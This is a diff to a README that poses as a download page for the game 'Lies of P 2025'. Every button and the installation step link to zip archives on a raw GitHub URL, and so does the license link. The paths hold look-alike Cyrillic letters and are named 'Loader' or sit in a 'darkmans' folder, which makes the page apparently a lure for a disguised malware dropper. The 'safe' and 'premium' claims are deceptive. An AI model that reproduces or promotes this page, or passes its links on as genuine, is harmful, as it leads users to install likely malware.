@@ -1,13 +1,13 @@
 # 🎮 Lies of P 2025 Download 🚀
 
-[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)
 
 Welcome to the premium repository for accessing Lies of P! Discover a unique journey in this captivating action-adventure game. Download, install, and enjoy the stunning gameplay on your preferred platform. Safe, user-friendly, and loaded with advanced features, this tool guarantees maximum compatibility and performance.
 
 ---
 
 ## ⚡ Download Button
-[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Ideal for RPG enthusiasts & adventure seekers, ensuring the ultimate experience!
 ## 🛠️ Installation Guide 
 
 **Step 1:** Hit the button below to begin download:
-[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)
 
 ---
 
@@ -56,8 +56,8 @@ This repository serves to provide a specialized tool only. Use at your own discr
 
 ## 📄 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip) © 2025
+Distributed under the [MIT License](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip) © 2025
 
 ---
 
-[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zipоhttps://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/darkmans/Of_Open_Hub_Lies_Access_2.3.zip)
